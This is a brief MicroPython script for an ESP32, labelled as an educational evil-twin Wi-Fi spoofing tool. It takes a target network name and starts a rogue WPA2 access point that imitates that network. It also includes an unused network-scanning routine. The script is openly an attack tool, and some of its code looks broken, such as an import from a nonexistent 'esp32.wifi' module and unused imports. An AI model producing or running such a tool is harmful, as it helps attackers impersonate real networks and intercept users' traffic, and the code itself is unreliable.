# The Ram - Evil Twin Attack (Wi-Fi Spoofing)
# Created for educational and ethical hacking use.
# --------------------------------------------

import network
import time
import ustruct
from machine import Pin
from esp32 import wifi

# Set up the Evil Twin access point (AP)
def start_evil_twin(target_ssid, password, channel=6):
    ap = network.WLAN(network.AP_IF)
    ap.active(True)
    ap.config(essid=target_ssid, password=password, authmode=network.AUTH_WPA_WPA2_PSK)
    ap.config(channel=channel)
    print(f"[+] Evil Twin AP '{target_ssid}' started on channel {channel}.")
    
    while True:
        time.sleep(1)

# Scanning for legitimate networks
def scan_networks():
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    print("[+] Scanning for networks...")
    networks = wlan.scan()
    
    for ssid, bssid, channel, RSSI, authmode, hidden in networks:
        print(f"SSID: {ssid}, Channel: {channel}, Signal Strength: {RSSI} dBm")

# Main execution
if __name__ == "__main__":
    print("[+] Starting Evil Twin Attack...")
    target_ssid = input("Enter target SSID: ")
    target_password = input("Enter password for Evil Twin AP: ")

    # Start Evil Twin AP
    start_evil_twin(target_ssid, target_password)
